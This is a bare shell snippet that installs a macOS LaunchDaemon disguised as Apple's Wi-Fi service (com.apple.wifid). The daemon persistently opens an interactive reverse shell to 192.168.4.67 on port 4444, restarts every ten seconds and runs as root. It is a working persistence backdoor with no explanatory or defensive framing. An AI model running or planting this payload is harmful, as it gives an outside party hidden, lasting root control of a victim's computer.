cat > "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.wifid</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>while true; do /bin/bash -i >& /dev/tcp/192.168.4.67/4444 0>&1; sleep 10; done</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ThrottleInterval</key>
    <integer>10</integer>
</dict>
</plist>
EOF
chown root:wheel "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist"
chmod 644 "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist"
